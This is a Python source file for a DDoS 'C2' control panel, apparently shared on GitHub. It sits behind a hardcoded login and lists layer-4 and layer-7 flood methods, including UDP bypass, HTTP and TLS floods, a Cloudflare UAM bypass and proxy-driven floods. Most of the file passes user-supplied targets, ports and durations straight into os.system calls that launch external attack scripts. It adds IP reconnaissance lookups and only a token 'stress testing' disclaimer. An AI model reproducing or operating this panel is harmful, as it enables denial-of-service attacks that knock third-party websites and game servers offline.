import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;255;255;255m[ \x1b[38;2;233;233;233mITS\x1b[38;2;255;255;255m] | \x1b[38;2;233;233;233mWelcome to ITS PN! \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mOwner: Lintar   \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mUpdate V5  ')
    print("")

def tools():
    clear()
    si()
    print(f'''
    TOOLS || LIST
    • geoip
    • reverseip
    • subnet-lookup
    • asn-lookup
    • dns-lookup
    • reverse-dns
''')
    
def banners():
    clear()
    si()
    print(f'''
    Pikacu
    Trool
''')

def layer4():
    clear()
    si()
    print(f'''
    \x1b[38;2;233;233;233mLAYER4 || LIST
    • UDPBYPASS
    • VH-RAW
    • OVH-BEAM
    • TCP
    • HOLD
    • IDAP
''')

def layer7():
    clear()
    si()
    print(f'''
    \x1b[38;2;233;233;233mLAYER7 || LIST
    • HULK
    • STRV3
    • STRV4
    • NUKE
    • POWER
    • MEDIUM
    • RAW-FLOOD
    • BOOMBER
    • HTTP-STROM
    • BOOM
    • RIP
    • TLS
    • ATTACK
    • BROWSER
    • TLS-BYPASS
    • CF-UAM
    • BROWSER
   
''')


def rules():
    clear()
    si()
    print(f'''
                ║ RULES || LIST
                ║ 2. Do not attack  go.id ac.id domains  ║
                ║ 4. Only attack stress testing servers         ║
                ║ 5. Don't skid the panel                       ║
                ║ 6. Give a star to the github repository       ║
                ║ 7. The creator does not do any harm           ║
''')

def ports():
    clear()
    si()
    print(f'''
    PORTS || LIST
    21. SFTP
    22. SSH
    23. telnet
    25.SMTP
    53.DNS
    25.MINECRAFT
    69.FTTP
    80.HTTP
    443.HTTPS
    3074.XBOX
    5060.PLAYSATION
    25565.MINECRAFT
    5060.RIP
    30120. FIVEM
''')

def LINC2():
    clear()
    si()
    print(f'''
    \x1b[38;2;233;233;233mItsC2 || List
    • LIN1
    • LIN2
    • LIN3
    • ITS
''')

def menu():
    sys.stdout.write(f"         \x1b]2;ITSC2 --> Botnet: {bots} | Online Users: [2-100] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("\x1b[38;2;255;255;255m[ \x1b[38;2;233;233;233mITS\x1b[38;2;255;255;255m] | \x1b[38;2;233;233;233mWelcome to ITS C2! \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mOwner: Lintar  \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mBotnet:" + str(bots) + "")
    print("")
    print("""
    
 ██▓▄▄▄█████▓  ██████       
▓██▒▓  ██▒ ▓▒▒██    ▒                    
▒██▒▒ ▓██░ ▒░░ ▓██▄               
░██░░ ▓██▓ ░   ▒   ██▒                   
░██░  ▒██▒ ░ ▒██████▒▒       
░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
 ▒ ░    ░    ░ ░▒  ░ ░
 ▒ ░  ░      ░  ░  ░  
 ░                 ░  
                      
                      
» Recommended layer7: TLS,BROWSER,RIP
» Recommended layer4: STRESS,PAPING

» Type"help"
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;255;255mC2@Lintar\n ==>\x1b[38;2;255;255;255m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "Lin" or cnc == "LINC2" or cnc == "linc2" or cnc == "LinC2":
            STRC2()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "OVH-BEAM" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
   
        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port>')
                print('Example: paping 1.1.1.1 443 120')
        

        elif "TCP" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')
                
# DDOSC2 METHODS

        elif "S1" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run STR.go -site {url} -data {method}')
            except IndexError:
                print('Usage: STR1 <url> METHODS<GET/POST>')
                print('Example: STR1 http://example.com GET')
                
        elif "STR2" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python2 STR.py {url}  ')
            except IndexError:
                print('Usage: STR2 <url> ')
                print('Example: STR2 http://example.com ')
                
       
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python3 flood.py {url}')
            except IndexError:
                print('Usage: flood <url>')
                print('Example: flood http://example.com')
               
               

# AMP/GAMES METHODS

        elif "SAMP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')
                
        elif "HTTPS-STORM" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'go run HTTPS-STORM.go {url} {port} {time}')
            except IndexError:
                print('Usage: HTTPS-STORM <url> <port> <time>')
                print('Example: HTTPS-STORM https://xxx.com/ 443 300')
                
        elif "HOLD" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'go run HOLD.go {url} {port} {time}')
            except IndexError:
                print('Usage: HOLD <url> <port> <time>')
                print('Example: HOLD https://xxx.com/ 443 300')
     
        elif "UDPBYPASS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: UDPBYPASS <ip> <port>')
                print('Example: UDPBYPASS 1.1.1.1 80')

        elif "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
         

# LAYER 7 METHODS
 
        elif "OVH-RAW" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "STRV4" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: STRV4 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: STRV4 http://example.com 15000 get 60')

        elif "TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node TLSV3.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: tlsv1 <url> <time> <req_per_ip>')
                print('Example: tlsv1 http://example.com 60 150')
                
        elif "TLS-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node TLS-BYPASS.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: TLS-BYPASS <url> <time> <req_per_ip>')
                print('Example: TLS-BYPASS http://example.com 60 150')
                
        elif "MEDIUM2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node BROWSER.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: BROWSER <url> <time> <req_per_ip>')
                print('Example: BROWSER http://example.com 60 150')          
                
        elif "BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node TLSV3.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: tlsv1 <url> <time> <req_per_ip>')
                print('Example: tlsv1 http://example.com 60 150')
                
        elif "RIP" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node TLSV3.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: tlsv1 <url> <time> <req_per_ip>')
                print('Example: tlsv1 http://example.com 60 150')
                
        elif "OMG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node tlsv5.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: tlsv3 <url> <time> <rps> <thread>')
                print('Example: tlsv3 example.com 60 512 95500')

        elif "NUKE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node Nuke.js {url} {time} 50 proxy.txt 100')
            except IndexError:
                print('Usage: nuke <url> <time>')
                print('Example: nuke http://example.com 100')
                
        elif "CF-UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CF-UAM.js {url} {time} 50 proxy.txt 100')
            except IndexError:
                print('Usage: CF-UAM <url> <time>')
                print('Example: CF-UAM http://example.com 100')
                
                
        elif "ATTACK" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node attack.js {url} {time} {threads}')
            except IndexError:
                print('Usage: attack <url> <time> <threads>')
                print('Example: attack http://example.com 100 9550')
                
        elif "LOL" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                req_per_sec = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'node lol.js {url} {threads} {req_per_sec} {time}')
            except IndexError:
                print('Usage: lol <url> <threads> <req_per_sec> <time>')
                print('Example: lol http://example.com 99550 512 120')    
                
        elif "RIP" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                req_per_sec = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'node lol.js {url} {threads} {req_per_sec} {time}')
            except IndexError:
                print('Usage: RIP <url> <threads> <req_per_sec> <time>')
                print('Example: RIP http://example.com 99550 512 120')          
              
        elif "MEDIUM" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                req_per_sec = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'node BOOMBER.js {url} {threads} {req_per_sec} {time}')
            except IndexError:
                print('Usage: BOOMBER <url> <threads> <req_per_sec> <time>')
                print('Example: BOOMBER http://example.com 995 512 120')         

        elif "BOOM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node flooder.js {url} {time} 50 proxy.txt 100 5')
            except IndexError:
                print('Usage: BOOM <url> <time>')
                print('Example: BOOM http://example.com 100')
                
        elif "POWER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node POWERFUL.js {url} {time} {thread} ssl.txt')
            except IndexError:
                print('Usage: POWER <url> <time> <thread>')
                print('Example: POWER http://example.com 100 95500')
       
        elif "HULK" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Low.go -site {url} -data {method}')
            except IndexError:
                print('Usage: hulkv1 <url> METHODS<GET/POST>')
                print('Example: hulkv1 http://example.com GET/POST')
                


# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER4  ► SHOW  METHODS
LAYER7  ► SHOW  METHODS
AMP     ► SHOW AMP METHODS
LINC2 ► SHOW STRC2 METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "Tipak"
    passwd = "2"
    username = input(" Username: ")
    password = getpass.getpass(prompt=' Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ TOLOL POKE PW AJA SALAH LU BOT...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to Its C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
